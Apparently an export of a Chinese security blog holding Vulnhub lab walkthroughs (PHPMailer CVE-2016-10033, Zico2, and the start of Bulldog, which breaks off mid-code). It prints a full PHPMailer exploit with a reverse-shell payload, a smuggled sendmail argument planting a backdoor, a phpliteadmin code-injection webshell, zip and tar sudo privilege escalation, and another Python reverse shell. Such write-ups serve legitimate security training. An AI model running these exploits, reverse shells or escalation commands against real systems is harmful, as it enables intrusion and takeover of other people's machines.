title="1.PHPMailer漏洞"></a>1.PHPMailer漏洞</h3><p>PHPMailer是一个很牛逼的php发送邮件的东西，但是PHPMailer小于<code>5.2.18</code>就有高危漏洞。</p><p>前面说过版本小于<code>5.2.18有漏洞</code>怎么验证呢？在kali里面使用<code>searchsplit</code>工具，查找这个软件漏洞。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit PHPMailer <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，有远程代码执行漏洞。</p><p><img src="/images/wordimage/2022/0324/phpmailerloudong.png"></p><p>这里我们直接使用<code>40974.py</code>这个文件，把这个文件复制到KALI根目录下面，使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/exploitdb/exploits/php/webapps/40974.py ./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个文件全部代码如下。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""# Exploit Title: PHPMailer Exploit v1.0# Date: 29/12/2016# Exploit Author: Daniel aka anarc0der# Version: PHPMailer &lt; 5.2.18# Tested on: Arch Linux# CVE : CVE 2016-10033Description:Exploiting PHPMail with back connection (reverse shell) from the targetUsage:1 - Download docker vulnerable enviroment at: https://github.com/opsxcq/exploit-CVE-2016-100332 - Config your IP for reverse shell on payload variable4 - Open nc listener in one terminal: $ nc -lnvp &lt;your ip>3 - Open other terminal and run the exploit: python3 anarcoder.pyVideo PoC: https://www.youtube.com/watch?v=DXeZxKr-qsUFull Advisory:https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html"""</span><span class="token keyword">from</span> requests_toolbelt <span class="token keyword">import</span> MultipartEncoder<span class="token keyword">import</span> requests<span class="token keyword">import</span> os<span class="token keyword">import</span> base64<span class="token keyword">from</span> lxml <span class="token keyword">import</span> html <span class="token keyword">as</span> lhos<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'clear'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" Version 1.0 - github.com/anarcoder - greetings opsxcq &amp; David Golunski\n"</span><span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token string">'http://localhost:8080'</span>backdoor <span class="token operator">=</span> <span class="token string">'/backdoor.php'</span>payload <span class="token operator">=</span> <span class="token string">'&lt;?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.0.12\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'</span>fields<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'action'</span><span class="token punctuation">:</span> <span class="token string">'submit'</span><span class="token punctuation">,</span>        <span class="token string">'name'</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>        <span class="token string">'email'</span><span class="token punctuation">:</span> <span class="token string">'"anarcoder\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\" @protonmail.com'</span><span class="token punctuation">,</span>        <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Pwned'</span><span class="token punctuation">&#125;</span>m <span class="token operator">=</span> MultipartEncoder<span class="token punctuation">(</span>fields<span class="token operator">=</span>fields<span class="token punctuation">,</span>                     boundary<span class="token operator">=</span><span class="token string">'----WebKitFormBoundaryzXJpHSq4mNy35tHe'</span><span class="token punctuation">)</span>headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'curl/7.47.0'</span><span class="token punctuation">,</span>         <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> m<span class="token punctuation">.</span>content_type<span class="token punctuation">&#125;</span>proxies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'http'</span><span class="token punctuation">:</span> <span class="token string">'localhost:8081'</span><span class="token punctuation">,</span> <span class="token string">'https'</span><span class="token punctuation">:</span><span class="token string">'localhost:8081'</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] SeNdiNG eVIl SHeLL To TaRGeT....'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> data<span class="token operator">=</span>m<span class="token punctuation">.</span>to_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                  headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token operator">+</span>backdoor<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+]  ExPLoITeD '</span> <span class="token operator">+</span> target<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们使用文本编辑器来修改代码，如下图提示修改即可。</p><p><img src="/images/wordimage/2022/0324/shellpy.png"></p><p>然后我们使用python命令来运行即可，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token number">40974</span>.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行成功，如下图，这样在靶机的<code>/var/www/html</code>目录下面就生成了一个<code>shell.php</code>的文件。</p><p><img src="/images/wordimage/2022/0324/succshell.png"></p><p>然后我们现在需要做的事情就是在KALI里面开启端口监听，访问<code>shell.php</code>即可，KALI开启监听命令如下，因为文件我们使用的是4444端口所以监听也要是4444端口。</p><p>如下图是KALI开启了监听，等待。</p><p><img src="/images/wordimage/2022/0324/nc-lnvp.png"></p><p>如下图是访问我们的木马文件。</p><p><img src="/images/wordimage/2022/0324/fangwen.png"></p><p>然后反弹成功，成功反弹了shell！！如下图。</p><p><img src="/images/wordimage/2022/0324/fantan.png"></p><hr><h2 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权"></a>三.提权</h2><p>首先切换shell，使用python切换，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">"import pty; pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0324/bash.png"></p><p>这里简单说一下，我探索的无用过程，首先看了一下用户也就是在<code>/etc/passwd</code>下面，确实有我们上面wpscan扫描出来的用户一个是<code>michael</code>和<code>steven</code>，然后发现还有一个mysql用户，意思是开放了3306端口？但是外面没有扫描到，应该是不允许外部登录，然后在<code>www</code>目录下面发现了第二个flag，如下图。</p><p><img src="/images/wordimage/2022/0324/flag2.png"></p><p>然后在html目录下面发现了，wordpress目录，只知道有用户，不知道密码，现在的思路是登录mysql数据库，然后看看能不能发现这两个用户的密码，所以我们先在wordpress目录下面查看<code>wp-config.php</code>文件查看数据库用户和密码，如下图，但是万一不是ssh连接密码就寄。</p><p><img src="/images/wordimage/2022/0324/databasepass.png"></p><p>所以数据库的账户和密码分别是。</p><blockquote><p>账户：root</p><p>密码：R@v3nSecurity</p></blockquote><p>然后登录mysql，使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql -u root -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看所有数据库，如下图。</p><p><img src="/images/wordimage/2022/0324/showdatabase.png"></p><p>然后就，根据如下图查询就可以查询所有wordpress账户和密码，然后可以拿去MD5枚举。</p><p><img src="/images/wordimage/2022/0324/password.png"></p><p>经过测试，第一个<code>michael</code>用户在线md5网站破解不了，但是第二个可以破解，密码是<code>pink84</code>，如下图。</p><p><img src="/images/wordimage/2022/0324/md5.png"></p><p>首先当然可以登录wordpress，但是这里猜想的是ssh是否也是这个密码，当然发现是OK的，如下图，可以登录进去，如下图，然后在切换shell即可。</p><p><img src="/images/wordimage/2022/0324/steven.png"></p><p>然后查看一番没有发现什么，然后使用命令<code>sudo -l</code>查看有啥权限的时候，发现可以使用python提权！，那这样，我们直接上面的命令前面加上sudo就直接切换到root用户了啊，如下命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> python -c <span class="token string">"import pty; pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图成功切换到，root用户并且，找到了所有flag。</p><p><img src="/images/wordimage/2022/0324/flag4.png"></p><hr><h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>对软件漏洞需要多了解，然后很多东西需要仔细看</p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-Zico2靶机实战</title>
      <link href="/2022/03441c2678.html"/>
      <url>/2022/03441c2678.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>下载地址：<a href="https://www.vulnhub.com/entry/zico2-1,210/">https://www.vulnhub.com/entry/zico2-1,210/</a></p><blockquote><p>KALI地址：192.168.1.18</p><p>靶机地址：192.168.1.29</p></blockquote><p>靶机描述如下</p><p>Description</p><p>Back to the Top</p><p>Zico’s Shop: A Boot2Root Machine intended to simulate a real world cenario</p><p>Disclaimer:</p><p>By using this virtual machine, you agree that in no event will I be liable for any loss or damage including without limitation, indirect or consequential loss or damage, or any loss or damage whatsoever arising from loss of data or profits arising out of or in connection with the use of this software.</p><p>TL;DR - You are about to load up a virtual machine with vulnerabilities. If something bad happens, it’s not my fault.</p><p>Level: Intermediate</p><p>Goal: Get root and read the flag file</p><p>Description:</p><p>Zico is trying to build his website but is having some trouble in choosing what CMS to use. After some tries on a few popular ones, he decided to build his own. Was that a good idea?</p><p>Hint: Enumerate, enumerate, and enumerate!</p><p>Thanks to: VulnHub</p><p>Author: Rafael (@rafasantos5)</p><p>Doesn’t work with VMware. Virtualbox only.</p><hr><h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>使用命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现了靶机地址，红色箭头所示</p><p><img src="/images/wordimage/2022/0323/netdisco.png"></p><hr><h3 id="2-主机扫描"><a href="#2-主机扫描" class="headerlink" title="2.主机扫描"></a>2.主机扫描</h3><p>使用命令如下，先进行简单的扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sV <span class="token number">192.168</span>.1.29<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现有了一些基本信息，但是感觉还是不够详细，这里看出的信息是开放了<code>80,22,111</code>端口</p><p><img src="/images/wordimage/2022/0323/nmapsv.png"></p><p>详细一点的扫描，使用命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -O -p <span class="token number">0</span>-65535 <span class="token number">192.168</span>.1.29<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现大致相同，多了一个<code>41312</code>的端口</p><p><img src="/images/wordimage/2022/0323/nmap-a.png"></p><hr><h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>前面nmap扫描发现了开放了80端口那么直接对靶机进行目录扫描，使用命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.1.29<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，看名字就感觉红色箭头奇怪。</p><p><img src="/images/wordimage/2022/0323/dbadmin.png"></p><hr><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><h3 id="1-文件包含"><a href="#1-文件包含" class="headerlink" title="1.文件包含"></a>1.文件包含</h3><p>在上述信息过程中还包括了，网页漏洞挖掘，和网页源代码查询，最终在网页首先的下面发现了<code>CHECK THEM OUT!</code>的字样，如下图红色箭头，很难不想象是文件包含。</p><p><img src="/images/wordimage/2022/0323/baohan.png"></p><p>经过测试，包含了<code>/etc/passwd</code>文件，发现确实有这个漏洞，并且发现了<code>zico</code>用户，如下图。</p><p><img src="/images/wordimage/2022/0323/zico.png"></p><hr><h3 id="2-CMS漏洞"><a href="#2-CMS漏洞" class="headerlink" title="2.CMS漏洞"></a>2.CMS漏洞</h3><p>经过上面信息收集目录扫描，发现了一个<code>dbadmin</code>的目录，然后里面有一个php文件，打开叫我们输入密码，如下图，经过弱密码测试，密码密码是<code>admin</code>。</p><p><img src="/images/wordimage/2022/0323/phpliteadmin.png"></p><p>进去之后也不知道干嘛，只能看看这个有啥漏洞了，在kali使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit phpliteadmin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现查找到了东西，如下图，发现有远程代码执行漏洞。</p><p><img src="/images/wordimage/2022/0323/remote.png"></p><p>既然发现了有远程代码执行漏洞，那就直接看文档怎么利用了，使用命令把文档拷贝到桌面上查看，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/exploitdb/exploits/php/webapps/24044.txt /root/Desktop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，照着利用就好了，但是。。。emmmm，看不懂咋办。</p><p><img src="/images/wordimage/2022/0323/24044.png"></p><p>下面是谷歌翻译的结果，然后我直接把翻译结果放下面了。</p><p><img src="/images/wordimage/2022/0323/fanyi.png"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text"># 漏洞利用标题：phpliteadmin &lt;= 1.9.3 远程 PHP 代码注入漏洞# Google Dork: inurl:phpliteadmin.php (默认密码: admin)# 日期：2013 年 1 月 10 日# 漏洞利用作者：L@usch - http://la.usch.io - http://la.usch.io/files/exploits/phpliteadmin-1.9.3.txt# 供应​​商主页：http://code.google.com/p/phpliteadmin/# 供应​​商状态：通知# 软件链接：http://phpliteadmin.googlecode.com/files/phpliteadmin_v1-9-3.zip# 版本：1.9.3# 测试环境：Windows 和 Linux描述：phpliteadmin.php#1784: '创建一个新数据库' =>phpliteadmin.php#1785: '当你创建一个新数据库时，如果你自己没有包含它，你输入的名称将附加适当的文件扩展名（.db、.db3、.sqlite 等）。数据库将在您指定为 $directory 变量的目录中创建。',攻击者可以创建一个带有 php 扩展名的 sqlite 数据库，并将 PHP 代码作为文本字段插入。完成后，攻击者只需使用 Web 浏览器访问数据库文件即可执行它。概念证明：1.我们创建一个名为“hack.php”的数据库。（取决于服务器配置，有时它不起作用，数据库的名称将是“hack.sqlite”。然后只需尝试将数据库/现有数据库重命名为“hack.php”。）该脚本会将 sqlite 数据库存储在与 phpliteadmin.php 相同的目录中。预览：http://goo.gl/B5n9O十六进制预览：http://goo.gl/lJ5iQ2. 现在在这个数据库中创建一个新表并插入一个具有默认值的文本字段：&lt;?php phpinfo()?>十六进制预览：http://goo.gl/v7USQ3. 现在我们运行 hack.php完毕！证明：http://goo.gl/ZqPVL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>OK，这下大概晓得了，先创建一个.php的数据库，然后在表里面写入php代码内容即可，跟着下面图片操作即可。</p><p><img src="/images/wordimage/2022/0323/buzhou.png"></p><p><img src="/images/wordimage/2022/0323/caozuo.png"></p><p>上面的操作，创建一个叫做hack.php的数据库然后创建了一个hack表，现在我们需要往里面写东西，如下图，这里写入的是phpinfo来验证是否可以显现出来。</p><p><img src="/images/wordimage/2022/0323/phpinfo.png"></p><p>因为上面创建数据库都显示了路径了，思路是用上面发现的文件包含漏洞，来包含我们创建的数据库php，如下图操作包含成功，能显示出来。</p><p><img src="/images/wordimage/2022/0323/succphpinfo.png"></p><p>既然可以这样了，那么思路来了，我们是否可以写入一句话木马，或者反弹shell。</p><hr><h3 id="3-写入一句话木马"><a href="#3-写入一句话木马" class="headerlink" title="3.写入一句话木马"></a>3.写入一句话木马</h3><p>如下图，写入了一句话木马。</p><p><img src="/images/wordimage/2022/0323/phpmuma.png"></p><p>然后通过蚁剑连接，如下图结果，是可以的。</p><p><img src="/images/wordimage/2022/0323/mumaok.png"></p><hr><h2 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权"></a>三.提权</h2><p>我们现在地权限进入了系统，剩下的就需要提权了，老样子先查看,home目录下面有什么东西，如下图，发现了wordpress。</p><p><img src="/images/wordimage/2022/0323/wordpress.png"></p><p>然后查看了一下wordpress的数据库配置文件<code>/wp-config.php</code>，如下图，然后发现用户是zico，因为上面查看passwd下面的文件的时候，发现有zico用户很难不会把这两个东西联想在一起。</p><p><img src="/images/wordimage/2022/0323/wordpresspwd.png"></p><blockquote><p>用户：zico</p><p>密码：sWfCsfJSPV9H3AmQzw8</p></blockquote><p>可以尝试一下ssh连接，如下图可以成功连接进去！</p><p><img src="/images/wordimage/2022/0323/sshzico.png"></p><p>然后这里尝试切换到root用户，发现不可行，如下图。</p><p><img src="/images/wordimage/2022/0323/sudo-i.png"></p><p>切换思路，查看现在这个用户有sudo啥权限，使用命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现可以使用zip和tar命令是root权限执行，如下图，意思是可以使用zip和tar提权。</p><p><img src="/images/wordimage/2022/0323/tiquan.png"></p><hr><h3 id="1-zip提权"><a href="#1-zip提权" class="headerlink" title="1.zip提权"></a>1.zip提权</h3><p>大概就是把一个文件zip打包的时候执行命令，可以看这个文章👉<a href="https://www.freebuf.com/articles/system/206007.html">ZIP提权</a>，如下操作步骤</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zico@zico:~$ <span class="token function">touch</span> <span class="token number">1</span>zico@zico:~$ <span class="token function">sudo</span> <span class="token function">zip</span> <span class="token number">1</span>.zip <span class="token number">1</span> -T --unzip-command<span class="token operator">=</span><span class="token string">"sh -c /bin/bash"</span>  adding: <span class="token number">1</span> <span class="token punctuation">(</span>stored <span class="token number">0</span>%<span class="token punctuation">)</span>root@zico:~<span class="token comment"># id</span><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>root@zico:~<span class="token comment"># whoami</span>root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下图操作结果，成功提权到了root用户。</p><p><img src="/images/wordimage/2022/0323/ziptiquan.png"></p><hr><h3 id="2-tar提权"><a href="#2-tar提权" class="headerlink" title="2.tar提权"></a>2.tar提权</h3><p>意思和上面zip差不多一样需要代码参数<code>--checkpoint</code>和<code>--checkpoint-action</code>来执行命令，但是并没有打包因为使用了<code>/dev/null</code>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zico@zico:~$ <span class="token function">touch</span> <span class="token number">1</span>zico@zico:~$ zico@zico:~$ <span class="token function">sudo</span> <span class="token function">tar</span> cf /dev/null <span class="token number">1</span> --checkpoint<span class="token operator">=</span><span class="token number">1</span> --checkpoint-action<span class="token operator">=</span>exec<span class="token operator">=</span>/bin/bashroot@zico:~<span class="token comment"># id</span><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>root@zico:~<span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下图结果，成功切换到root权限。</p><p><img src="/images/wordimage/2022/0323/tartiquan.png"></p><p>然后查看flag就可以完事了，如下图flag。</p><p><img src="/images/wordimage/2022/0323/flag.png"></p><hr><h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>对于我来说的话需要注意的是提权操作，这个算是新玩意了。</p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-Bulldog靶机实战</title>
      <link href="/2022/03145ca60a.html"/>
      <url>/2022/03145ca60a.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>下载地址:<a href="https://www.vulnhub.com/entry/bulldog-1,211/">https://www.vulnhub.com/entry/bulldog-1,211/</a></p><blockquote><p>KALI地址：192.168.1.18</p><p>靶机地址：192.168.1.28</p></blockquote><p>靶机提示</p><p>Description</p><p>Bulldog Industries recently had its website defaced and owned by the malicious German Shepherd Hack Team. Could this mean there are more vulnerabilities to exploit? Why don’t you find out? :)</p><p>This is a standard Boot-to-Root. Your only goal is to get into the root directory and see the congratulatory message, how you do it is up to you!</p><p>Difficulty: Beginner/Intermediate, if you get stuck, try to figure out all the different ways you can interact with the system. That’s my only hint ;)</p><p>Made by Nick Frichette (frichetten.com) Twitter: @frichette_n</p><p>I’d highly recommend running this on Virtualbox, I had some issues getting it to work in VMware. Additionally DHCP is enabled so you shouldn’t have any troubles getting it onto your network. It defaults to bridged mode, but feel free to change that if you like.</p><hr><h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>使用命令如下，进行主机发现，并且发现了靶机</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0322/netdis.png"></p><hr><h3 id="2-扫描主机"><a href="#2-扫描主机" class="headerlink" title="2.扫描主机"></a>2.扫描主机</h3><p>使用nmap扫描命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sV <span class="token number">192.168</span>.1.28<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0322/netdis.png"></p><p>担心扫不全，使用如下命令在扫一次(～￣▽￣)～。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -O -p <span class="token number">0</span>-65535 <span class="token number">192.168</span>.1.28<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0322/port.png"></p><p>扫完发现，开放了<code>23,80,8080</code>端口，并且23号端口对应的是ssh端口，然后80和8080都是http服务，意味着我们可以直接在浏览器访问。</p><p>如下图直接访问的首页</p><p><img src="/images/wordimage/2022/0322/index.png"></p><hr><h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>使用命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.1.28<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现能扫出来很多很多东西，发现主目录只有如下红色箭头的位置</p><p><img src="/images/wordimage/2022/0322/dir.png"></p><hr><h3 id="4-网页信息挖掘"><a href="#4-网页信息挖掘" class="headerlink" title="4.网页信息挖掘"></a>4.网页信息挖掘</h3><p>首先进行简单的网页挖掘，比如查看网页首页源代码有什么东西，发现并没有什么东西👇</p><p><img src="/images/wordimage/2022/0322/index-2.png"></p><p>同理，然后首页的Public Notice点进去也没有什么东西可以发现，所以需要转换目标，看向我们上面目录扫描出来的目录经过发现有<code>admin</code>和<code>dev</code>两个目录，如下图是访问admin目录的样子👇，发现是django框架，就不能用php的方式来了，猜测应该要暴力破解之类的。</p><p><img src="/images/wordimage/2022/0322/django.png"></p><p>如下图是访问dev目录的样子。</p><p><img src="/images/wordimage/2022/0322/dev.png"></p><hr><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><h3 id="1-残余信息收集"><a href="#1-残余信息收集" class="headerlink" title="1.残余信息收集"></a>1.残余信息收集</h3><p>经过一番查找发现在dev下的网页源代码里面有猫腻如下图，一堆md5，还是这样对应的很难不想象，这些md5就是对应的这些账户的密码，所以可以拿去在线网站枚举。</p><p><img src="/images/wordimage/2022/0322/md5.png"></p><p>经过在线md5解密，发现能解出来的只有nict用户，如下图结果，所以得到一个信息，或者相反？</p><blockquote><p>用户：nick</p><p>密码：bulldog</p></blockquote><p><img src="/images/wordimage/2022/0322/nick.png"></p><p>但是解sarah用户的md5能解出来，只不过。。。看下图就知道了2333，所以我应该换一个网站？</p><p><img src="/images/wordimage/2022/0322/sara.png"></p><p>经过一番解密，在👉<a href="https://www.somd5.com/">输入让你无语的MD5</a>，这个网站解出来了，如下图。</p><p><img src="/images/wordimage/2022/0322/somd5.png"></p><p>所以又得到一个信息如下</p><blockquote><p>用户：sarah</p><p>密码：bulldoglover</p></blockquote><p>然后，我现在的想法是这些可不可以ssh连接？答案是当然不行(～￣▽￣)～，转换思路，刚才不是发现了一个django登录页面呢，万一可以进去呢，答案是当然可以，确实能进去，但是啥也不能干啊，两个用户都能进去，如下两张图。</p><p><img src="/images/wordimage/2022/0322/nicklogin.png"></p><p><img src="/images/wordimage/2022/0322/sarahlogin.png"></p><p>又要转换思路了，进去啥也不能干啊，于是在dev目录下找到了一个shell控制台如下图</p><p><img src="/images/wordimage/2022/0322/shell.png"></p><hr><h3 id="2-反弹shell"><a href="#2-反弹shell" class="headerlink" title="2.反弹shell"></a>2.反弹shell</h3><p>既然可以执行命令了那么猜测也可以执行反弹shell之类的，这里使用python来反弹shell，因为网站是用的是django来搭建的，代码如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>oss<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"192.168.1.18"</span><span class="token punctuation">,</span><span class="token string">"6666"</span><span 